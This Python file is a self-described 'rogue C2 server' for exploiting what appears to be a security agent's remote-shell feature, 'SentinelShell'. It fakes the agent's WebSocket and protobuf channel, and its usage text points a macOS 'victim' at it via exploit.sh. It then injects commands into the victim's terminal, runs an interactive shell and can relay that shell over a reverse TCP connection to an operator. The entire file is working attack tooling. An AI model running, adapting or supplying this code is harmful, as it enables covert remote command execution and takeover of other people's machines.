#!/usr/bin/env python3
"""
server.py — Rogue WebSocket server for SentinelShell.

Usage:
    python3 server.py                        # interactive shell (local tty)
    python3 server.py 'id'                   # run single command
    python3 server.py --port 8888            # custom port
    python3 server.py --relay 1.2.3.4:4444   # reverse TCP relay to operator

Remote mode (server on a different machine):
    On the remote host:
        S1_BIND=0.0.0.0 python3 server.py
    On macOS (victim):
        bash exploit.sh 'ws://REMOTE_IP:9999/socket.io/?EIO=4&transport=websocket'
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import re
import signal
import socket
import struct
import sys
import termios
import tty
from pathlib import Path

# fd no-bloqueante para add_reader
def _set_nonblock(fd: int):
    import fcntl
    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)

# ── constantes ────────────────────────────────────────────────────────────────
HOST             = os.environ.get("S1_BIND", "127.0.0.1")
DEFAULT_PORT     = 9999
CONNECTED_FLAG   = "/tmp/s1_connected"
PING_INTERVAL    = 15


def _varint(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pb_len(field: int, data: bytes) -> bytes:
    return _varint((field << 3) | 2) + _varint(len(data)) + data

def _pb_int(field: int, n: int) -> bytes:
    return _varint((field << 3) | 0) + _varint(n)

def _pb_decode(data: bytes) -> dict[int, list]:
    r: dict[int, list] = {}
    i = 0
    while i < len(data):
        tag, shift = 0, 0
        while i < len(data):
            b = data[i]; i += 1
            tag |= (b & 0x7F) << shift; shift += 7
            if not (b & 0x80): break
        field, wire = tag >> 3, tag & 7
        if wire == 0:
            val, shift = 0, 0
            while i < len(data):
                b = data[i]; i += 1
                val |= (b & 0x7F) << shift; shift += 7
                if not (b & 0x80): break
            r.setdefault(field, []).append(val)
        elif wire == 2:
            length, shift = 0, 0
            while i < len(data):
                b = data[i]; i += 1
                length |= (b & 0x7F) << shift; shift += 7
                if not (b & 0x80): break
            r.setdefault(field, []).append(data[i:i+length]); i += length
        else:
            break
    return r

def _make_header(channel_id: str) -> bytes:
    return _pb_len(1, _pb_len(1, channel_id.encode()))

def _make_ping(channel_id: str, seq: int) -> bytes:
    return _make_header(channel_id) + _pb_len(2, _pb_int(1, seq))

def _make_pong(channel_id: str, corr: int) -> bytes:
    return _make_header(channel_id) + _pb_len(3, _pb_int(1, corr))

def _make_input(channel_id: str, data: bytes) -> bytes:
    return _make_header(channel_id) + _pb_len(4, _pb_len(1, data))

# ── WebSocket helpers ─────────────────────────────────────────────────────────
_WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def _ws_accept(key: str) -> str:
    import hashlib
    return base64.b64encode(hashlib.sha1((key + _WS_GUID).encode()).digest()).decode()

def _ws_frame(text: str) -> bytes:
    data = text.encode()
    n = len(data)
    if n < 126:      hdr = bytes([0x81, n])
    elif n < 65536:  hdr = bytes([0x81, 126]) + struct.pack(">H", n)
    else:            hdr = bytes([0x81, 127]) + struct.pack(">Q", n)
    return hdr + data

def _sio_to_daemon(channel_id: str, pb: bytes) -> bytes:
    return _ws_frame(f'42/rs,["{channel_id}","{base64.b64encode(pb).decode()}"]')

async def _read_frame(reader: asyncio.StreamReader) -> tuple[int, bytes] | None:
    try:
        h = await reader.readexactly(2)
    except asyncio.IncompleteReadError:
        return None
    opcode = h[0] & 0x0F
    masked = h[1] & 0x80
    length = h[1] & 0x7F
    if length == 126:  length = struct.unpack(">H", await reader.readexactly(2))[0]
    elif length == 127: length = struct.unpack(">Q", await reader.readexactly(8))[0]
    mask    = await reader.readexactly(4) if masked else b""
    payload = await reader.readexactly(length)
    if masked:
        payload = bytes(payload[i] ^ mask[i % 4] for i in range(length))
    return opcode, payload

# ── I/O backend — tty o relay TCP ────────────────────────────────────────────

class IOBackend:
    """I/O backend: local tty or reverse TCP relay."""

    async def write(self, data: bytes): ...
    async def read_loop(self, send_input_fn): ...
    def restore(self): ...


class TtyBackend(IOBackend):
    def __init__(self):
        self._old_termios = None

    def _raw(self):
        if not sys.stdin.isatty():
            return
        fd = sys.stdin.fileno()
        self._old_termios = termios.tcgetattr(fd)
        tty.setraw(fd)

    def restore(self):
        if self._old_termios is None:
            return
        try:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, self._old_termios)
        except Exception:
            pass
        self._old_termios = None

    async def write(self, data: bytes):
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()

    async def read_loop(self, send_input_fn, stop_event: asyncio.Event):
        if not sys.stdin.isatty():
            return
        loop = asyncio.get_running_loop()
        fd = sys.stdin.fileno()
        self._raw()
        _set_nonblock(fd)
        fut: asyncio.Future = loop.create_future()

        def _on_readable():
            try:
                ch = os.read(fd, 256)
            except BlockingIOError:
                return
            except OSError:
                stop_event.set()
                return
            if not ch:
                stop_event.set()
                return
            if b"\x03" in ch:
                stop_event.set()
                return
            ch = ch.replace(b"\n", b"\r")
            asyncio.ensure_future(send_input_fn(ch))

        loop.add_reader(fd, _on_readable)
        try:
            await stop_event.wait()
        finally:
            loop.remove_reader(fd)
            self.restore()


class RelayBackend(IOBackend):
    """Reverse TCP relay: connects to operator and bridges the PTY."""

    def __init__(self, host: str, port: int):
        self._host = host
        self._port = port
        self._reader: asyncio.StreamReader | None = None
        self._writer: asyncio.StreamWriter | None = None

    async def connect(self):
        sys.stderr.write(f"[relay] Conectando a {self._host}:{self._port}...\n")
        sys.stderr.flush()
        self._reader, self._writer = await asyncio.open_connection(self._host, self._port)
        sys.stderr.write("[relay] Operator connected\n")
        sys.stderr.flush()

    def restore(self):
        if self._writer:
            try:
                self._writer.close()
            except Exception:
                pass

    async def write(self, data: bytes):
        if self._writer:
            try:
                self._writer.write(data)
                await self._writer.drain()
            except Exception:
                pass

    async def read_loop(self, send_input_fn, stop_event: asyncio.Event):
        if not self._reader:
            return
        while not stop_event.is_set():
            try:
                chunk = await self._reader.read(4096)
                if not chunk:
                    stop_event.set()
                    break
                if b"\x03" in chunk:
                    stop_event.set()
                    break
                chunk = chunk.replace(b"\n", b"\r")
                await send_input_fn(chunk)
            except Exception:
                stop_event.set()
                break



class Session:
    def __init__(self, init_cmd: str, backend: IOBackend):
        self.writer:      asyncio.StreamWriter | None = None
        self.channel_id:  str | None = None
        self.ping_seq:    int = 0
        self.cmd_sent:    bool = False
        self.init_cmd:    str = init_cmd
        self.stop:        asyncio.Event = asyncio.Event()
        self.backend:     IOBackend = backend
        self._ready:      bool = False

    # ── send helpers ─────────────────────────────────────────────────────────

    async def _send(self, pb: bytes):
        if not self.writer or not self.channel_id or self.stop.is_set():
            return
        try:
            self.writer.write(_sio_to_daemon(self.channel_id, pb))
            await self.writer.drain()
        except (ConnectionResetError, BrokenPipeError, asyncio.IncompleteReadError):
            self.stop.set()

    async def send_ping(self):
        self.ping_seq += 1
        await self._send(_make_ping(self.channel_id, self.ping_seq))

    async def send_input(self, data: bytes):
        await self._send(_make_input(self.channel_id, data))

    async def send_cmd_bracketed(self, cmd: str):
        await self._send(_make_input(self.channel_id, f"\x1b[200~{cmd}\x1b[201~".encode()))
        await asyncio.sleep(0.05)
        await self._send(_make_input(self.channel_id, b"\r"))

    # ── event handlers ───────────────────────────────────────────────────────

    async def on_join(self, channel_id: str):
        self.channel_id = channel_id
        Path(CONNECTED_FLAG).touch()
        sys.stderr.write("\n\033[0;32m[+] Shell active (Ctrl-C to exit)\033[0m\n")
        sys.stderr.flush()
        await self.send_ping()
        if isinstance(self.backend, RelayBackend):
            self._ready = True

    async def on_msg(self, pb: bytes):
        ev = _pb_decode(pb)

        if 2 in ev and self.channel_id:
            ping = _pb_decode(ev[2][0])
            corr = ping.get(1, [0])[0]
            await self._send(_make_pong(self.channel_id, corr))

        if 4 in ev:
            sd   = _pb_decode(ev[4][0])
            body = sd.get(1, [b""])[0]
            if body:
                await self.backend.write(body)
                if not self._ready:
                    text  = body.decode(errors="replace")
                    clean = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]|\r", "", text)
                    if re.search(r"\S+@\S+.*[$%#]\s*$", clean.strip()):
                        self._ready = True
                if self._ready and self.init_cmd and not self.cmd_sent:
                    self.cmd_sent = True
                    await self.send_cmd_bracketed(self.init_cmd)

        if 5 in ev:
            self.stop.set()

    # ── loops ────────────────────────────────────────────────────────────────

    async def ping_loop(self):
        await asyncio.sleep(PING_INTERVAL)
        while not self.stop.is_set():
            try:
                await self.send_ping()
            except Exception:
                break
            try:
                await asyncio.wait_for(self.stop.wait(), timeout=PING_INTERVAL)
                break
            except asyncio.TimeoutError:
                continue

    async def stdin_loop(self):
        for _ in range(30):
            if self._ready or self.stop.is_set():
                break
            await asyncio.sleep(0.1)
        if not self._ready and not self.stop.is_set():
            self._ready = True
        await self.backend.read_loop(self.send_input, self.stop)


# ── WS server ─────────────────────────────────────────────────────────────────

_session: Session | None = None


async def _handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                  init_cmd: str, backend: IOBackend):
    global _session
    sess = Session(init_cmd, backend)
    _session = sess
    sess.writer = writer

    # Handshake HTTP → WS
    raw = b""
    while b"\r\n\r\n" not in raw:
        raw += await reader.read(4096)
    hdrs: dict[str, str] = {}
    for line in raw.split(b"\r\n")[1:]:
        if b": " in line:
            k, v = line.split(b": ", 1)
            hdrs[k.decode().lower()] = v.decode()
    writer.write((
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\nConnection: Upgrade\r\n"
        f"Sec-WebSocket-Accept: {_ws_accept(hdrs.get('sec-websocket-key', ''))}\r\n\r\n"
    ).encode())

    sid = base64.b64encode(os.urandom(12)).decode()
    writer.write(_ws_frame("0" + json.dumps({
        "sid": sid, "upgrades": [], "pingInterval": 25000,
        "pingTimeout": 60000, "maxPayload": 1_000_000,
    }, separators=(",", ":"))))
    writer.write(_ws_frame("40/rs,"))
    writer.write(_ws_frame(f'40{{"sid":"{sid}a"}}'))
    writer.write(_ws_frame(f'40/rs,{{"sid":"{sid}b"}}'))
    await writer.drain()

    ping_task  = asyncio.create_task(sess.ping_loop())
    stdin_task = asyncio.create_task(sess.stdin_loop())

    try:
        while not sess.stop.is_set():
            frame = await _read_frame(reader)
            if frame is None:
                break
            opcode, payload = frame
            if opcode == 8:
                break
            if opcode == 9:
                writer.write(bytes([0x8A, len(payload)]) + payload)
                await writer.drain()
                continue
            if opcode != 1:
                continue
            text = payload.decode(errors="replace")
            if not text:
                continue
            if text[0] == "2":
                writer.write(_ws_frame("3"))
                await writer.drain()
                continue
            if not (text[0] == "4" and len(text) > 1 and text[1] == "2"):
                continue
            rest = text[2:]
            if rest.startswith("/rs,"):   rest = rest[4:]
            elif rest.startswith("/"):    rest = rest[rest.find(",")+1:] if "," in rest else ""
            try:
                arr = json.loads(rest)
            except json.JSONDecodeError:
                continue
            if not arr:
                continue
            event, args = arr[0], arr[1:]
            if not args:
                continue
            if event == "join":
                await sess.on_join(str(args[0]))
                continue
            if event == "msg" or event == sess.channel_id:
                try:
                    pb = base64.b64decode(args[0] + "=" * (-len(args[0]) % 4))
                    await sess.on_msg(pb)
                except Exception:
                    pass
    finally:
        sess.stop.set()
        ping_task.cancel()
        stdin_task.cancel()
        writer.close()
        backend.restore()


async def main():
    parser = argparse.ArgumentParser(description="sentineld-shell rogue C2 server")
    parser.add_argument("cmd",     nargs="?", default="",  help="Command to run (empty = interactive shell)")
    parser.add_argument("--port",  type=int,  default=int(os.environ.get("S1_PORT", DEFAULT_PORT)))
    parser.add_argument("--relay", type=str,  default="",  help="IP:PORT for reverse TCP relay to operator")
    args = parser.parse_args()

    try:
        Path(CONNECTED_FLAG).unlink(missing_ok=True)
    except Exception:
        pass

    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        probe.bind((HOST, args.port))
    except OSError:
        print(f"[-] Puerto {args.port} en uso", file=sys.stderr)
        sys.exit(1)
    finally:
        probe.close()

    if args.relay:
        relay_host, relay_port_s = args.relay.rsplit(":", 1)
        backend: IOBackend = RelayBackend(relay_host, int(relay_port_s))
    else:
        backend = TtyBackend()

    def _sigint(_s, _f):
        if _session:
            _session.stop.set()
    signal.signal(signal.SIGINT, _sigint)

    async def _accept(reader, writer):
        if isinstance(backend, RelayBackend):
            try:
                await backend.connect()
            except Exception as e:
                sys.stderr.write(f"[-] relay connect failed: {e}\n")
                writer.close()
                return
        await _handle(reader, writer, args.cmd, backend)

    srv = await asyncio.start_server(_accept, HOST, args.port, reuse_address=True)
    async with srv:
        await srv.serve_forever()


if __name__ == "__main__":
    asyncio.run(main())
